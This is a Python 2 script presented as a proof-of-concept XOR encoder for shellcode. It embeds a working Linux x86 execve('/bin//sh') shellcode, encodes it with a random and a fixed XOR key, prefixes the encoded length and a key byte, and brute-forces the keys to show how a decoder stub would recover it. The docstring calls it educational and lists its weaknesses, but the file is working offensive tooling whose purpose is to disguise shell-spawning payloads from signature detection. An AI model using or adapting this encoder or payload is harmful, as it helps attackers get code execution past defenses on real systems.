#!/usr/bin/python
"""
Author: Mutti K
Purpose: Proof of Concept Python shellcode XOR encoder.
Paste your shellcode into the script and an the newly generated shellcode will be printed to the console.
Has ability to create new shellcode everytime because shellcode key is random, well kind off, it's 8 bits long.
Shellcode encryption key is not included in final encrypted shellcode.
Decryption involves knowing xor_fixed_key and guessing shell_key.
Limitations: Original shellcode cannot be larger than 255 bytes. This is because a single byte is used to hold shellcode length.
Know plaintext weakness. shellcode with strings like /bin/sh will be easy to identify.
If xor key is same as xor'ed shellcode byte then result is 0x00. This makes it trivial to identify xor key if run against known plaintext.
Note: This code is intended for education purposes and not for real world use. This is not real encryption.
TODO: Implement decryption algorithm in assembly with xor key cracker functionality. This is to ensure that xor key is not hardcoded.
"""
import sys
import random

settings = {'debug':1,'timeout':5,'retry':5,  'xor_fixed_key':187}
shellcode = ("\x31\xc0\x89\xc2\x89\xc1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")

def main(argv):
	shellcode_len = len(bytearray(shellcode))
	if shellcode_len > 255 or shellcode_len <1:
		print ("Shellcode is %d bytes, Must be less than 255 bytes" % shellcode_len)
	else:
		print "Original decrypted shellcde: %s" % shellcode.encode('hex')
		print '\nXOR random encryption shellcode ...'
		len_key, temp_key, encrypted_shellcode = xor_random(settings['xor_fixed_key'], shellcode)
		#Demonstrate how decrypter will crack/reverse process
		print "\nGoing to crack shellcode encryption key ..."
		cracked_shell_key,  cracked_len = crackXorKey(len_key, temp_key, settings['xor_fixed_key'])
		#Verify reverse process
		#Try to reverse xor process with output of new keys from previous call
		print '\nReverse encrypted shellcode using cracked keys ...'
		xor_shellcode( cracked_shell_key, settings['xor_fixed_key'],  encrypted_shellcode.decode('hex'))

'''
Purpose: XOR encrypt shellcode. Requires two xor key bytes. First xor key is random while second xor key is fixed.
Each byte block of the shellcode is encrypted with a unique shellcode xor key byte that isn't known to the caller.
To decrypt, you need to know fixed xor key and random xor key used.
Reason random xor key was used was so that decryption key is was not contained plaintext in encrypted shellcode.
Parameters: Fixed xor byte key, bytearray of plaintext shellcode.
Returns: Prints to screen encrypted shellcode with two prepended bytes, encrypted byte of shellcode length, and temp xor key.
Function returns encryted byte representing shellcode length, temp xor byte key, encrypted shellcode. [shellcode length (xor)]+[temp xor key]+[xor'ed shellcode']
'''
def xor_random(fixed_xor_key,  shellcode):
	XOR_SHELL_KEY =  random.randint(1,255)
	XOR_FIXED_KEY =  fixed_xor_key
	#print "SHELL KEY:"+hex(XOR_SHELL_KEY)

	len_key,  temp_key, encrypted_shellcode = xor_shellcode(XOR_SHELL_KEY,  XOR_FIXED_KEY,  shellcode)
	return (len_key,  temp_key, encrypted_shellcode)

"""
Purpose: retrieve shellcode encryption keys. Bruteforce 255 possible keys.
"""
def crackXorKey(len_key, temp_key, fixed_key):
	#Generate xor keys
	XOR_SHELL_KEY =  0
	SHELLCODE_LEN = 0
	XOR_SHELLCODE_LEN = 0
	XOR_TEMP_KEY = 0
	for XOR_SHELL_KEY in range(1, 255):
		XOR_TEMP_KEY = XOR_SHELL_KEY^fixed_key
		if XOR_TEMP_KEY == temp_key:
			for SHELLCODE_LEN in range(1, 255):
				x = SHELLCODE_LEN^XOR_TEMP_KEY 
				if len_key == x:
					print "Cracked the keys. Key used to encrypt shellcode: %x. Real shellcode length: %x" %( XOR_SHELL_KEY, SHELLCODE_LEN ) 
					return (XOR_SHELL_KEY, SHELLCODE_LEN)
	
'''
The func
XOR a byte array
'''
def xor_shellcode(xor_random_key, xor_fixed_key ,  plain_shellcode):
	shellcode = plain_shellcode
	encoded = ""
	encoded_shellcode = ""
	loop_count = 0 # Shellcode length
	shellcode_len = len(bytearray(shellcode))
	#Generate xor keys
	XOR_SHELL_KEY =  xor_random_key
	XOR_FIX_KEY =  xor_fixed_key
	XOR_TEMP_KEY =  XOR_SHELL_KEY^XOR_FIX_KEY
	XOR_LEN_KEY = shellcode_len^XOR_TEMP_KEY
	
	for shellcode_byte in bytearray(shellcode) :
		loop_count += 1
		# XOR Encoding 	
		y = shellcode_byte^XOR_SHELL_KEY
		encoded += '0x'
		encoded += '%02x' %y
		encoded_shellcode += '%02x' %y
		
		if loop_count < shellcode_len:
			encoded += ','

	encoded = '0x%02x,' %XOR_TEMP_KEY + encoded 
	#Prepend loop count to final encoded shellcode
	encoded = '0x%02x,' %XOR_LEN_KEY + encoded 

	print "Encrypted shellcode: %s" %encoded

	print ("Keys XOR_SHELL_KEY: 0x%02x, XOR_FIX_KEY: 0x%02x, XOR_TEMP_KEY: 0x%02x, XOR_LEN_KEY: 0x%02x" %( XOR_SHELL_KEY,  XOR_FIX_KEY,XOR_TEMP_KEY, XOR_LEN_KEY ) )
	print 'Shellcode len: %d + 2 bytes for length and temp_key prefix bytes %d.\n[enc shellcode length] + [xor temp key] + [encrypted shellcode]' % (shellcode_len, shellcode_len+2)
	return (XOR_LEN_KEY, XOR_TEMP_KEY,  encoded_shellcode)

if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except Exception as e:
        print 'Cannot run program.\n', e
        if (settings['debug'] is not None):
            raise
